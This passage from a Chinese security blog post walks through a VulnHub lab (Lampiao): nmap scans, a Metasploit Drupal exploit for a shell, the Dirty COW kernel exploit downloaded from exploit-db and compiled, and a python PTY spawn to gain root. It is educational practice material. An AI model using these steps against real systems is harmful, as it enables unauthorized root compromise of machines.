title=\"0x06\"></a>0x06</h3><p>这个时候访问root目录下的key.txt文件得到key值：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624100331322.png\" alt=\"image-20220624100331322\"></p>\n<h2 id=\"0x06-脏牛Linux内核提权\"><a href=\"#0x06-脏牛Linux内核提权\" class=\"headerlink\" title=\"0x06 脏牛Linux内核提权\"></a>0x06 脏牛Linux内核提权</h2><h3 id=\"0x00-3\"><a href=\"#0x00-3\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>靶机：vulnhub-Lampiao</p>\n<p>攻击机：Kali</p>\n<h3 id=\"0x01-2\"><a href=\"#0x01-2\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>namp扫一下网段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap x.x.x.0&#x2F;24<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200236287.png\" alt=\"image-20220624200236287\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200211257.png\" alt=\"image-20220624200211257\"></p>\n<p>可以看到192.168.216.151这个主机存在80端口。</p>\n<h3 id=\"0x02-2\"><a href=\"#0x02-2\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>访问这个web服务：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200422897.png\" alt=\"image-20220624200422897\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200413371.png\" alt=\"image-20220624200413371\"></p>\n<p>没有什么关键信息。</p>\n<h3 id=\"0x03-2\"><a href=\"#0x03-2\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>再使用nmap针对这个主机扫描所有端口：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -p1-65535 192.168.216.151<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200803493.png\" alt=\"image-20220624200803493\"></p>\n<p>又扫到一个1898端口开放的服务，直接访问。</p>\n<h3 id=\"0x04-1\"><a href=\"#0x04-1\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200848384.png\" alt=\"image-20220624200848384\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200856765.png\" alt=\"image-20220624200856765\"></p>\n<p>是一个web服务。</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624200949207.png\" alt=\"image-20220624200949207\"></p>\n<p>页底有一个Powered by Drupal，猜测是一个cms，网上直接搜。</p>\n<h3 id=\"0x05-1\"><a href=\"#0x05-1\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624201111502.png\" alt=\"image-20220624201111502\"></p>\n<h3 id=\"0x06-1\"><a href=\"#0x06-1\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><p>这里直接使用MSF搜索相关漏洞：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624201357307.png\" alt=\"image-20220624201357307\"></p>\n<p>直接使用2018年最新的exploit进行漏洞利用，设置攻击ip和对应端口，</p>\n<p>（2019年漏洞显示normal不可利用）</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202340135.png\" alt=\"image-20220624202340135\"></p>\n<h3 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h3><p>返回会话成功：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202419183.png\" alt=\"image-20220624202419183\"></p>\n<h3 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h3><p>查看权限为普通权限：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624202457991.png\" alt=\"image-20220624202457991\"></p>\n<p>使用漏洞探针脚本上传到靶机进行探针：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624203945287.png\" alt=\"image-20220624203945287\"></p>\n<p>可以看到没有执行权限，添加权限后执行脚本：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624204100119.png\" alt=\"image-20220624204100119\"></p>\n<p>这里没有给出脏牛漏洞。</p>\n<p>直接下载脏牛漏洞：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>下载地址：<a href=\"http://www.exploit-db.com/download/40611\">http://www.exploit-db.com/download/40611</a></p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624204557669.png\" alt=\"image-20220624204557669\"></p>\n<p>这里下载完是一个文件，不是c文件，需要重命名或者从本地上传至靶机。</p>\n<h3 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h3><p>本地下载好40611.cpp文件上传至靶机：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210315111.png\" alt=\"image-20220624210315111\"></p>\n<h3 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>使用以下命令编译：<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40611.cpp -lutil</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210640766.png\" alt=\"image-20220624210640766\"></p>\n<p>编译出dcow这个文件。</p>\n<h3 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h3><p>这里漏洞若要利用必须开一个模拟终端，这是漏洞成因造成的。因为产生一个交互式shell，就比如shell输入密码需要交互是一个道理。这里使用python产生一个伪终端。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>产生交互式命令：<br>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210653315.png\" alt=\"image-20220624210653315\"></p>\n<p>这里获取到了root的密码（不是真正的修改，而是临时copy的一个root权限 )。</p>\n<h3 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h3><p>root登录在&#x2F;root目录下获取flag(这里可以以root创建一个新用户，加入root用户组，然后登录靶机) </p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210740592.png\" alt=\"image-20220624210740592\"></p>\n","text":"0x00脑图： 0x01 信息收集LinEnum、linuxprivchecker脚本0x00 LinEnum需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。 （tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86LinEnum%E3%80%81linuxprivchecker%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">0x01 信息收集LinEnum、linuxprivchecker脚本</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-LinEnum\"><span class=\"toc-text\">0x00 LinEnum</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-linuxprivchecker\"><span class=\"toc-text\">0x01 linuxprivchecker</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E9%92%88linux-exploit-suggester1-2%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">0x02 漏洞探针linux-exploit-suggester1-2脚本</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-linux-exploit-suggester\"><span class=\"toc-text\">0x00 linux-exploit-suggester</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-linux-exploit-suggester2\"><span class=\"toc-text\">0x01 linux-exploit-suggester2</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-SUID\"><span class=\"toc-text\">0x03 SUID</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E8%AE%BE%E7%BD%AE%E5%92%8C%E5%8F%96%E6%B6%88SUID\"><span class=\"toc-text\">0x01 设置和取消SUID</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-SUID%E8%BF%9B%E8%A1%8CLinux%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x04  SUID进行Linux提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-1\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-Linux%E6%9C%AC%E5%9C%B0%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x05 Linux本地内核漏洞提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-2\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-%E8%84%8F%E7%89%9BLinux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x06 脏牛Linux内核提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-3\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-2\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-2\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-2\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-1\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05-1\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06-1\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x09\"><span class=\"toc-text\">0x09</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x10\"><span class=\"toc-text\">0x10</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x11\"><span class=\"toc-text\">0x11</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x12\"><span class=\"toc-text\">0x12</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"权限提升-Linux提权2","uid":"94e89ed0a4dcaf9a831f6c95bed9331c","slug":"权限提升-Linux提权2","date":"2022-06-25T01:38:59.000Z","updated":"2022-06-25T11:58:34.017Z","comments":true,"path":"api/articles/权限提升-Linux提权2.json","keywords":null,"cover":[],"text":"0x00 Linux 提权SUID配合环境变量本地提权0x00首先需要普通权限用户登录主机： 上传demo.c文件至主机的普通用户文件夹： 0x01 使用以下命令编译demo.c文件，编译出shell文件：gcc demo.c -o shell 0x02环境变量：一个命令对应执行...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"权限提升-windows提权2","uid":"c0a50503f3bb03b0879376d7c8e571c3","slug":"权限提升-windows提权2","date":"2022-06-21T15:02:18.000Z","updated":"2022-06-22T16:00:24.862Z","comments":true,"path":"api/articles/权限提升-windows提权2.json","keywords":null,"cover":[],"text":"0x00 RottenPotato(烂土豆)配合令牌窃取提权0x00 原理1.欺骗“NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。 2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个...","link":"","photos":[],"count_time":{"symbolsCount":"3.6k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}